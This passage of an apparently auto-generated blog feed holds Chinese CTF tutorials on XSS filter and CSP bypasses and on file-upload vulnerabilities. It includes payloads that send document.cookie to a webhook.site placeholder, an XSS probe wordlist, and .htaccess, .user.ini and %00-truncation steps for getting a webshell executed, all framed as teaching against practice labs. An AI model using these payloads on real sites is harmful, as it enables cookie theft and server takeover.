&quot;</code>都被过滤了，但<code>&#39;</code>与<code>onerror</code>等标签属性并没有被过滤，因此可以使用<code>&#39;</code>造闭合使用，使用语句<code>&#39; onmouseover=alert(1) &#39;</code>，进行对前面<code>value</code>的闭合和添加属性，<code>onmouseover</code></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>level8<br>level9<br>level10<br>level11<br>level12<br>level13<br>level14<br>level15<br>level16<br>level17<br>level18<br>level19<br>level20<br>level21<br>level22<br>level23<br>level24<br>level25<br>level26<br>level27<br>level28<br>level29<br>level30<br>level31<br>level32<br>level33<br>level34<br>level35<br>level36<br>level37<br>level38<br>level39<br>level40</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;XSS-LAB题解&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="CTF-WriteUp" scheme="https://we11s.github.io/tags/CTF-WriteUp/"/>
    
    <category term="Web-XSS" scheme="https://we11s.github.io/tags/Web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS绕过篇</title>
    <link href="https://we11s.github.io/posts/1946610579/"/>
    <id>https://we11s.github.io/posts/1946610579/</id>
    <published>2024-03-05T11:35:40.000Z</published>
    <updated>2024-03-17T10:20:54.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><p>内容安全策略（Content-Security-Policy,简称CSP）</p><blockquote><p>内容安全策略 （CSP） 被认为是一种浏览器技术，主要用于防御跨站点脚本 （XSS） 等攻击。内容安全策略为白名单策略，通过定义和详细说明浏览器可以安全地加载资源的路径和源，<strong>不加载除Content-Security-Policy以外的内容</strong></p></blockquote><p> <strong>使用 CSP的方式</strong></p><ol><li>使用 <code>Content-Security-Policy</code> HTTP 头</li><li>在html中添加入<code>meta</code>标签</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>详细介绍：<a href="https://cloud.tencent.com/developer/section/1189856">Content-Security-Policy (CSP) - HTTP 中文开发手册 - 开发者手册 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security-Policy - HTTP | MDN (mozilla.org)</a></p></blockquote><h3 id="window-location-绕过"><a href="#window-location-绕过" class="headerlink" title="window.location 绕过"></a><code>window.location</code> 绕过</h3><p>因为当今大部分网站的跳转功能都是由前端实现的，CSP一般不影响<code>window.location</code>对象的跳转到新的链接。所以，可以尝试使用跳转来绕过CSP获取数据</p><p>playroad类似于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">assign</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure><h3 id="Iframe标签绕过"><a href="#Iframe标签绕过" class="headerlink" title="Iframe标签绕过"></a><code>Iframe</code>标签绕过</h3><h4 id="Iframe标签简介"><a href="#Iframe标签简介" class="headerlink" title="Iframe标签简介"></a><code>Iframe</code>标签简介</h4><p><strong>HTML 内联框架元素 (<code>&lt;iframe&gt;</code>)</strong> 能够将另一个 HTML 页面嵌入到当前页面中。比较特别的是，如果能将页面内中的</p><h2 id="eval-绕过"><a href="#eval-绕过" class="headerlink" title="eval()绕过"></a><code>eval()</code>绕过</h2><h1 id="XSS绕过总结"><a href="#XSS绕过总结" class="headerlink" title="XSS绕过总结"></a>XSS绕过总结</h1><h3 id="探测字典："><a href="#探测字典：" class="headerlink" title="探测字典："></a>探测字典：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br><span class="line">&lt; &gt;</span><br><span class="line">&lt;script&gt; &lt;/script&gt;</span><br><span class="line">&lt;Script&gt; &lt;/Script&gt;</span><br><span class="line">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt;</span><br><span class="line">Onerror</span><br><span class="line">onerror</span><br><span class="line">javascript:</span><br><span class="line">JavaScript:</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line">eval()</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">src</span><br><span class="line">&#123;&#125;</span><br><span class="line">/</span><br><span class="line">+</span><br></pre></td></tr></table></figure><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a>文章引用</h1><ul><li><p>引用博主「J0k3r」的文章</p><p>原文链接：<a href="https://j0k3r.top/2019/11/19/csp-bypass/">https://j0k3r.top/2019/11/19/csp-bypass/</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;CSP绕过&quot;&gt;&lt;a href=&quot;#C</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-XSS" scheme="https://we11s.github.io/tags/Web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>SSTI漏洞-基础篇</title>
    <link href="https://we11s.github.io/posts/416548136/"/>
    <id>https://we11s.github.io/posts/416548136/</id>
    <published>2024-03-05T11:26:19.000Z</published>
    <updated>2024-04-09T10:25:29.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://we11s.github.io/posts/154257042/"/>
    <id>https://we11s.github.io/posts/154257042/</id>
    <published>2024-03-01T12:33:11.000Z</published>
    <updated>2024-05-29T17:54:26.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以<strong>向服务器上传恶意文件并进行执行</strong>，后获得<strong>执行服务端命令的能力</strong>。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><h3 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h3><ul><li><strong>不充分的文件验证</strong>：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。</li><li><strong>不安全的文件存储</strong>：如果上传的文件存储在可通过Web直接访问的位置，且文件名可预测或未经过适当处理，攻击者可能会执行上传的恶意文件。</li><li><strong>未对权限进行限制</strong>：权限上没有对于上传的文件目录设置不可执行权限。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>CTFHUB-技能树-WEB-文件上传-无验证</strong></p><p>因为在上传文件后无验证文件信息以及设置动态脚本不可被执行，因此便可直接上传远程木马文件，</p><details class="folding-tag" ><summary> 查看图片 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305194710871.png" alt="image-20240305194710871"></p>              </div>            </details><p>上传后访问此网站路径下的<code>/upload/shell.php</code>发现是空白界面，说明<strong>php文件可以被执行</strong>，此时通过冰蝎进行远程连接</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305194939723.png" alt="image-20240305194939723"></p>              </div>            </details><p>出现phpinfo页面，说明连接成功，即可获得主机部分权限，转到对应目录读取<code>flag</code></p><details class="folding-tag" ><summary> 查看图片 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305195139075.png" alt="image-20240305195139075"></p>              </div>            </details><h1 id="后端绕过-解析漏洞"><a href="#后端绕过-解析漏洞" class="headerlink" title="后端绕过-解析漏洞"></a>后端绕过-解析漏洞</h1><blockquote><p>解析漏洞通常指的是当应用程序或服务器在处理上传文件时，由于对文件类型的解析不当或不安全，导致攻击者能够上传恶意文件，从而执行不当操作或获取不当权限的安全问题。例如允许用户上传<code>.htaccess</code>文件导致用户可以设置任意文件格式的解析方式</p></blockquote><h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a><code>.htaccess</code>绕过</h2><h3 id="htaccess简介"><a href="#htaccess简介" class="headerlink" title=".htaccess简介"></a><code>.htaccess</code>简介</h3><p><code>.htaccess</code>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。通过<code>.htaccess</code>可以做到：重写<strong>解析规则</strong>(如：将<code>png</code>文件作为<code>php</code>来进行解析等)、URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。</p><h3 id="htaccess的作用范围"><a href="#htaccess的作用范围" class="headerlink" title=".htaccess的作用范围"></a><code>.htaccess</code>的作用范围</h3><p><code>.htaccess</code>的生效范围为<code>.htaccess</code>文件所在的当前目录。</p><h3 id="htaccess利用前提"><a href="#htaccess利用前提" class="headerlink" title=".htaccess利用前提"></a><code>.htaccess</code>利用前提</h3><ul><li>使用<code>Apache</code> 服务器（ 不适用于<code>Nginx</code> 服务器）</li><li>能成功上传<code>.htaccess</code>文件的上传，且没有被重命名</li></ul><h3 id="htaccess使用模板"><a href="#htaccess使用模板" class="headerlink" title=".htaccess使用模板"></a><code>.htaccess</code>使用模板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#对于php</span><br><span class="line">AddHandler application/x-httpd-php .html #将html文件作为php文件进行解析</span><br></pre></td></tr></table></figure><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-.htaccess</strong></p><p>查看页面源码可以发现页面后端源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CTFHub 文件上传 - htaccess&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CTFHub 文件上传 - htaccess&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $ext = pathinfo($name)[&#x27;extension&#x27;];</span><br><span class="line">    $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</span><br><span class="line">    if (!in_array($ext, $blacklist)) &#123;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>在 <code>$blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</code>发现大多数的动态执行脚本文件后缀被禁止，但发现<code>.htaccess</code>并没有被禁止，此时可以上传文件<code>.htaccess</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure><p>再上传含有shell的php代码的<code>txt</code>文件，上传成功后，访问<code>upload/shell.php.txt</code>，无内容显示，说明<code>.txt</code>文件被作为php脚本执行成功，使用冰蝎连接</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305203044058.png"></p>              </div>            </details><p>成功获取<code>phpinfo</code>页面，连接成功，读取flag</p><h2 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a><code>.user.ini</code>绕过</h2><h3 id="user-ini介绍"><a href="#user-ini介绍" class="headerlink" title=".user.ini介绍"></a><code>.user.ini</code>介绍</h3><p><code>php.ini</code>是php的一个<strong>全局配置</strong>文件，<strong>对整个web服务起作用</strong>；而<code>.user.ini</code>与<code>.htaccess</code>类似，设置当前目录的配置信息。</p><p>详细参考信息：</p><p><a href="https://www.php.net/manual/zh/configuration.file.per-user.php">PHP: .user.ini 文件 - Manual</a>、<a href="https://segmentfault.com/a/1190000011552335">php - 神秘的.user.ini文件</a></p><p>其中<code>php</code> 配置项中有两个配置可以起到文件包含的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //将指定文件包含在该目录中所有php脚本的文件头部</span><br><span class="line">auto_append_file = &lt;filename&gt;          //将指定文件包含在该目录中所有php脚本的文件尾部</span><br></pre></td></tr></table></figure><h3 id="user-ini使用前提"><a href="#user-ini使用前提" class="headerlink" title=".user.ini使用前提"></a><code>.user.ini</code>使用前提</h3><ul><li>能成功上传<code>.user.ini</code>文件的上传，且没有被重命名</li><li>此目录下已有一个任意的<code>.php</code>文件</li></ul><h3 id="user-ini作用范围"><a href="#user-ini作用范围" class="headerlink" title=".user.ini作用范围"></a><code>.user.ini</code>作用范围</h3><p>与<code>.htaccess</code>文件相同，<code>.user.ini</code>的生效范围为<code>.user.ini</code>文件所在的当前目录。</p><h3 id="user-ini使用方法"><a href="#user-ini使用方法" class="headerlink" title=".user.ini使用方法"></a><code>.user.ini</code>使用方法</h3><p>1.首先上传一个含有<code>php</code>代码的任意符合后端检测的文件，以<code>.jpg</code>为例：</p><p>文件名为<code>info.jpg</code>,内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>2.载上传入<code>.user.ini</code>文件，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = info.jpg   </span><br></pre></td></tr></table></figure><p>注：<code>info.jpg</code>需要自己上传问文件名来确定</p><p>3.访问文件上传目录下的任意<code>.php</code>文件即可</p><h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><h2 id="数字后缀绕过"><a href="#数字后缀绕过" class="headerlink" title="数字后缀绕过"></a>数字后缀绕过</h2><h3 id="数字后缀简介"><a href="#数字后缀简介" class="headerlink" title="数字后缀简介"></a>数字后缀简介</h3><p>PHP 文件的标准后缀始终是 <code>.php</code>，适用于所有版本的 PHP。然而，在某些特定场景或由某些开发者&#x2F;系统中，使用<code>.php3</code> 、<code>.php5</code> 、<code>.php7</code> 等不是 PHP 语言的标准文件后缀,由于一些特殊的设置<code>.php7</code> 等后缀可被PHP解释器解析</p><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>Apache 的配置文件或目录下的<code>.htaccess</code> 文件有添加设置，如<code>.php7</code>可被解析的配置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php7</span><br></pre></td></tr></table></figure><h2 id="利用中间件漏洞"><a href="#利用中间件漏洞" class="headerlink" title="利用中间件漏洞"></a>利用中间件漏洞</h2><blockquote><p>中间件漏洞是指在计算机系统中使用的中间件软件中存在的安全漏洞。中间件是指位于操作系统和应用程序之间的软件组件，用于提供不同应用程序之间的通信和交互。常见的中间件包括数据库管理系统、Web服务器(如：<code>Apache</code>、<code>Nginx</code>)等。</p></blockquote><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="/posts/2304588875/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">中间件漏洞</div>            <div class="tag-link-sitename"> 点击查看中间件漏洞文章</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h1 id="后端绕过-软件漏洞"><a href="#后端绕过-软件漏洞" class="headerlink" title="后端绕过-软件漏洞"></a>后端绕过-软件漏洞</h1><blockquote><p>利用PHP某些版本的BUG可以做到一些意想不到的效果。例如，<code>00</code>截断</p></blockquote><h2 id="PHP-00截断绕过"><a href="#PHP-00截断绕过" class="headerlink" title="PHP 00截断绕过"></a>PHP <code>00</code>截断绕过</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://gudiffany.github.io/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Diffany</div>            <div class="tag-link-sitename"> 感谢Diffany师傅提供的指导</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h3 id="00截断利用条件"><a href="#00截断利用条件" class="headerlink" title="00截断利用条件"></a><code>00</code>截断利用条件</h3><ul><li>php版本要小于5.3.4，5.3.4及以上已经修复该问题</li><li>PHP的magic_quotes_gpc为OFF状态</li><li>用户可指定上传路径</li></ul><h3 id="00绕过简介"><a href="#00绕过简介" class="headerlink" title="00绕过简介"></a><code>00</code>绕过简介</h3><p>ASCII中0作为特殊字符保留，表示字符串结束。</p><p>当用户传递文件<strong>上传路径包含</strong><code>00</code>，无论<code>00</code>后存在任何内容文本(或后端直接对<code>00</code>字符串进行拼接其他字符串)，<code>00</code>后的内容都会被截断，最后字符串留下<code>00</code>前的内容且<strong>不包括</strong><code>00</code>。</p><p><strong>以GET方式举例：</strong></p><p>ASCII中的<code>00</code>，无法直接显示，所以使用URL编码，ASCII中<code>00</code>经过url编码后变为<code>%00</code></p><p>页面源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>test.txt</code>的内容为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;SUCCESS&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>test.txt%00.2.txt</code>的内容为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;False&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>实验1</strong></p><p>此时通过GET传递参数，<code>?file=test.txt%00.2.txt</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240310203142775.png" alt="image-20240310203142775"></p>              </div>            </details><p>页面出现SUCCESS，说明<code>include</code>的文件是<code>test.txt</code>，此时<code>file</code>被解析为<code>test.txt</code></p><p><strong>实验2：改变页面源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.2.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时通过GET传递参数，<code>?file=test.txt%00</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240310203219223.png" alt="image-20240310203219223"></p>              </div>            </details><p>页面还是出现SUCCESS，说明<code>include</code>的文件是<code>test.txt</code>，而不是<code>test.txt.2.txt</code>，此时变量<code>file</code>受<code>$_GET[&#39;file&#39;]</code>中的影响，一同被截断</p><h3 id="00绕过方法"><a href="#00绕过方法" class="headerlink" title="00绕过方法"></a><code>00</code>绕过方法</h3><h4 id="GET传参保存路径"><a href="#GET传参保存路径" class="headerlink" title="GET传参保存路径"></a>GET传参保存路径</h4><p>后端对文件路径的处理类似为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/对文件名的处理操作......&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure><p>此时<code>road</code>为我们可控的参数，可直接进行使用<code>%00</code>截断</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/915b5ae1a067f5ffc307790bc7a964df.png" alt="915b5ae1a067f5ffc307790bc7a964df"></p>              </div>            </details><p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>shell.php</code>,根据位置，访问<code>/upload/shell.php</code>,即进入我们所在的页面，使用蚁剑连上后，可以找到我们成功截断的<code>shell.php</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/bf5ed62c6866f2d35525c1d4a5505f9b.png" alt="bf5ed62c6866f2d35525c1d4a5505f9b"></p>              </div>            </details><h4 id="POST传参保存路径"><a href="#POST传参保存路径" class="headerlink" title="POST传参保存路径"></a>POST传参保存路径</h4><p>与GET传参类似的的是：后端对文件路径的处理类似为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/对文件名的处理操作......&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure><p>此时<code>road</code>为我们可控的参数，但与GET传参不同的是，<strong>http请求内包含文件时，POST参数不再被自动解码</strong>，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为<code>00</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/2688a4e300bf53dea64eb094b8d2ae55.png" alt="2688a4e300bf53dea64eb094b8d2ae55"></p>              </div>            </details><p>步骤一：修改路径添加文件名，写入需要执行的代码语句</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/6e15d3a27f66fc4152400ddbecb2dbfb.png" alt="6e15d3a27f66fc4152400ddbecb2dbfb"></p>              </div>            </details><p>步骤一：切换为十六进制模式，修改所需要替换为<code>00</code>的位置</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/2671bae349c3b99667fdab4ac7d326ea.png" 